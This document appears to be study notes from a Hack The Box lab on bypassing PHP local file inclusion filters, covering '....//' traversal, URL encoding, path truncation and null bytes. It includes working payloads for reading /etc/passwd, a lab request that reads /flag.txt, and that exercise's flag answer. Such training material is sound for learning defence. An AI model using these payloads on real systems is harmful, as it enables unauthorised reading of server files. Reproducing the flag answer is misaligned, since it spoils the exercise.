# Basic Bypasses
## Non-Recursive Path Traversal Filters

```
$language = str_replace('../', '', $_GET['language']);
```

Bypass with:

```
....// 
```

## Encoding
Some web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions we may find custom filters that may be bypassed through URL encoding.

## Appended Extension
### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of `4096` characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

```shellsession
masterofblafu@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

### Null Bytes
PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. 

## Questions
1. The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt **Answer: HTB{64\$!c_f!lt3r\$_w0nt_\$t0p_lf!}**
   - Bypass recursive filter with this payload:
        ```
        GET /index.php?language=languages/....//....//....//....//....//....//....//....//....//....//flag.txt HTTP/1.1
        ```
        ```
        <SNIP>
        HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
        <SNIP>
        ```